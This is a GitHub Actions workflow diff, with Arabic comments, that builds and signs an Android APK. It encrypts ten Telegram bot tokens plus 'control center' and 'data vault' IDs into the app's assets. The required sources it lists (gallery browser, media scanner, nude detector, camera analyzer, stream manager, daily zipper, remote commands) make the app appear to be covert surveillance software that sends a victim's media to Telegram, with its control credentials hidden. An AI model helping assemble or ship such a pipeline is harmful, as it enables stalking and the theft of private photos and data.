@@ -30,7 +30,72 @@ jobs:
           java-version: '17'
           distribution: 'temurin'
 
-      # ... (خطوات توليد tokens.enc كما هي) ...
+      # ============================================================
+      # ✅ إنشاء ملف tokens.enc من GitHub Secrets (قبل Gradle)
+      # ============================================================
+      - name: Install cryptography for token encryption
+        run: pip install cryptography
+
+      - name: Generate encrypted tokens.enc
+        env:
+          BOT_1: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
+          BOT_2: ${{ secrets.TELEGRAM_BOT_2_TOKEN }}
+          BOT_3: ${{ secrets.TELEGRAM_BOT_3_TOKEN }}
+          BOT_4: ${{ secrets.TELEGRAM_BOT_4_TOKEN }}
+          BOT_5: ${{ secrets.TELEGRAM_BOT_5_TOKEN }}
+          BOT_6: ${{ secrets.TELEGRAM_BOT_6_TOKEN }}
+          BOT_7: ${{ secrets.TELEGRAM_BOT_7_TOKEN }}
+          BOT_8: ${{ secrets.TELEGRAM_BOT_8_TOKEN }}
+          BOT_9: ${{ secrets.TELEGRAM_BOT_9_TOKEN }}
+          BOT_10: ${{ secrets.TELEGRAM_BOT_10_TOKEN }}
+          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
+          VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
+          SECRET: ${{ secrets.TELEGRAM_SECRET }}
+          SECRET_KEY: ${{ secrets.SECRET_KEY }}
+        run: |
+          python3 -c "
+          import json, base64, os, hashlib
+          from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+          from cryptography.hazmat.primitives import padding
+
+          # ✅ استخدام المفتاح من البيئة بدلاً من الثابت المكشوف
+          key_str = os.environ['SECRET_KEY']
+          key = hashlib.sha256(key_str.encode('utf-8')).digest()
+
+          data = {
+              'active': [os.environ['BOT_1'], os.environ['BOT_2'], os.environ['BOT_3'], os.environ['BOT_4'], os.environ['BOT_5'], os.environ['BOT_6']],
+              'reserve': [os.environ['BOT_7'], os.environ['BOT_8'], os.environ['BOT_9'], os.environ['BOT_10']],
+              'ctrl_id': int(os.environ['CTRL_ID']),
+              'vault_id': int(os.environ['VAULT_ID']),
+              'secret': os.environ['SECRET']
+          }
+
+          json_str = json.dumps(data).encode('utf-8')
+          padder = padding.PKCS7(128).padder()
+          padded_data = padder.update(json_str) + padder.finalize()
+
+          cipher = Cipher(algorithms.AES(key), modes.ECB())
+          encryptor = cipher.encryptor()
+          encrypted = encryptor.update(padded_data) + encryptor.finalize()
+
+          encoded = base64.b64encode(encrypted).decode('utf-8')
+          os.makedirs('app/src/main/assets', exist_ok=True)
+          with open('app/src/main/assets/tokens.enc', 'w') as f:
+              f.write(encoded)
+          print('✅ tokens.enc generated and encrypted successfully')
+          "
+
+      # ============================================================
+      # ✅ التحقق من وجود ملف tokens.enc بعد إنشائه
+      # ============================================================
+      - name: Verify tokens.enc exists
+        run: |
+          if [ -f "app/src/main/assets/tokens.enc" ]; then
+            echo "✅ tokens.enc created successfully."
+          else
+            echo "❌ tokens.enc not found!"
+            exit 1
+          fi
 
       - name: Setup Gradle
         uses: gradle/actions/setup-gradle@v4
@@ -38,11 +103,107 @@ jobs:
           gradle-version: '8.2'
           validate-wrappers: false
 
-      - name: Build Release APK
-        run: |
-          ./gradlew assembleRelease -Dorg.gradle.jvmargs="-Xmx2048m" --no-daemon
+      # ============================================================
+      # ✅ منح صلاحيات التنفيذ لـ gradlew (استعداداً لأي أمر قد يستخدمه)
+      # ============================================================
+      - name: Make gradlew executable
+        run: chmod +x gradlew
 
-      # ====== ✅ توقيع APK باستخدام debug keystore ======
+      # ============================================================
+      # ✅ 1. التحقق من وجود الملفات الأساسية قبل البناء
+      # ============================================================
+      - name: Check critical source files
+        id: check_files
+        run: |
+          echo "🔍 Checking critical source files..."
+          MISSING_FILES=""
+          
+          CRITICAL_FILES=(
+            "app/src/main/java/com/example/app/MainActivity.kt"
+            "app/src/main/java/com/example/app/DailyZipper.kt"
+            "app/src/main/java/com/example/app/Monitor.kt"
+            "app/src/main/java/com/example/app/TelegramUi.kt"
+            "app/src/main/java/com/example/app/Commands.kt"
+            "app/src/main/java/com/example/app/GalleryBrowser.kt"
+            "app/src/main/java/com/example/app/MediaScanner.kt"
+            "app/src/main/java/com/example/app/NudeDetector.kt"
+            "app/src/main/java/com/example/app/CameraAnalyzer.kt"
+            "app/src/main/java/com/example/app/ConfigLoader.kt"
+            "app/src/main/java/com/example/app/SecurityHelper.kt"
+            "app/src/main/java/com/example/app/FileDownloader.kt"
+            "app/src/main/java/com/example/app/StreamManager.kt"
+            "app/src/main/java/com/example/app/MapExtensions.kt"
+            "app/src/main/java/com/example/app/ForegroundService.kt"
+            "app/src/main/AndroidManifest.xml"
+            "app/build.gradle.kts"
+            "build.gradle.kts"
+            "settings.gradle.kts"
+            "gradle.properties"
+          )
+          
+          for file in "${CRITICAL_FILES[@]}"; do
+            if [ ! -f "$file" ]; then
+              echo "❌ Missing: $file"
+              MISSING_FILES="$MISSING_FILES\n  - $file"
+            else
+              echo "✅ Found: $file"
+            fi
+          done
+          
+          if [ -n "$MISSING_FILES" ]; then
+            echo "⚠️ WARNING: Some critical files are missing!"
+            echo "MISSING_FILES=true" >> $GITHUB_OUTPUT
+            echo "MISSING_LIST=$MISSING_FILES" >> $GITHUB_OUTPUT
+          else
+            echo "✅ All critical files found!"
+            echo "MISSING_FILES=false" >> $GITHUB_OUTPUT
+          fi
+
+      # ============================================================
+      # ✅ 2. عرض هيكل المشروع لتسهيل التصحيح
+      # ============================================================
+      - name: Print project structure (debug)
+        run: |
+          echo "===== Project Structure (app/src/main/java) ====="
+          find app/src/main/java -type f -name "*.kt" | sort || echo "No Kotlin files found!"
+          echo ""
+          echo "===== Project Structure (app/src/main/res) ====="
+          find app/src/main/res -type f | sort || echo "No resource files found!"
+          echo ""
+          echo "===== Project Structure (app/src/main/assets) ====="
+          find app/src/main/assets -type f | sort || echo "No assets found!"
+
+      - name: Print DailyZipper.kt content
+        run: |
+          echo "===== DailyZipper.kt content ====="
+          cat app/src/main/java/com/example/app/DailyZipper.kt || echo "File not found!"
+          echo "================================="
+
+      # ============================================================
+      # ✅ 3. التنظيف والبناء باستخدام Gradle (بدون ./gradlew)
+      # ============================================================
+      - name: Clean project
+        run: gradle clean --no-daemon
+
+      - name: Build Release APK
+        id: build
+        run: |
+          set +e
+          echo "🚀 Building Release APK..."
+          gradle assembleRelease -Dorg.gradle.jvmargs="-Xmx2048m" --no-daemon
+          BUILD_EXIT_CODE=$?
+          set -e
+          echo "BUILD_EXIT_CODE=$BUILD_EXIT_CODE" >> $GITHUB_OUTPUT
+          if [ $BUILD_EXIT_CODE -ne 0 ]; then
+            echo "❌ Build failed with exit code $BUILD_EXIT_CODE"
+            exit $BUILD_EXIT_CODE
+          else
+            echo "✅ Build succeeded!"
+          fi
+
+      # ============================================================
+      # ✅ توقيع APK باستخدام debug keystore
+      # ============================================================
       - name: Generate debug keystore
         run: |
           keytool -genkey -v -keystore debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Debug, OU=Debug, O=Debug, L=Debug, ST=Debug, C=US"
@@ -77,4 +238,38 @@ jobs:
             echo "⚠️ Signed APK not found!"
           fi
 
-      # ... (باقي الخطوات كتقرير فشل) ...
+      # ============================================================
+      # ✅ 4. تقرير فشل شامل (مبسط)
+      # ============================================================
+      - name: Send comprehensive failure report
+        if: failure()
+        env:
+          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
+          CHAT_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
+        run: |
+          REPORT_FILE="build_failure_report.txt"
+          {
+            echo "❌ BUILD FAILURE REPORT"
+            echo "========================"
+            echo ""
+            echo "📦 Repository: ${{ github.repository }}"
+            echo "🔄 Run ID: ${{ github.run_id }}"
+            echo "📅 Date: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
+            echo ""
+            echo "📂 Build Environment:"
+            echo "  - OS: ${{ runner.os }}"
+            echo "  - JDK: 17"
+            echo "  - Gradle: 8.2"
+            echo ""
+            echo "📄 CRITICAL FILES CHECK:"
+            echo "------------------------"
+            echo "${{ steps.check_files.outputs.MISSING_LIST || '✅ All files found' }}"
+            echo ""
+            echo "📄 Gradle Version:"
+            echo "------------------"
+            gradle --version 2>/dev/null || echo "Gradle not found!"
+            echo ""
+            echo "--- End of report ---"
+          } > "$REPORT_FILE"
+          curl -s -F "chat_id=$CHAT_ID" -F "document=@$REPORT_FILE" -F "caption=❌ تقرير فشل البناء" \
+            "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
